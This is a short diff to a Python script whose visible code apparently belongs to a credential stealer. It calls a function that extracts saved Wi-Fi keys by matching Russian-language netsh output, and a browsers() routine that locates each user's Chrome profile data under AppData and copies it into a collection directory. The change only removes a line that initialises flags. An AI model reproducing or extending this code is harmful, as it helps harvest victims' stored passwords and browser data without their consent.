@@ -134,8 +134,6 @@ try:
 			networkpass("Все профили пользователей", "Содержимое ключа")
 
 		def browsers():
-			gccopy = ogxcopy = ocopy = fcopy = ycopy = vcopy = bcopy = cccopy = ccopy = coccopy = False
-
 			if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)):
 				src = "C:/Users/{0}/AppData/Local/Google/Chrome/User Data/Default/".format(user)
 				if os.path.exists(dio + "\\Google Chrome"):
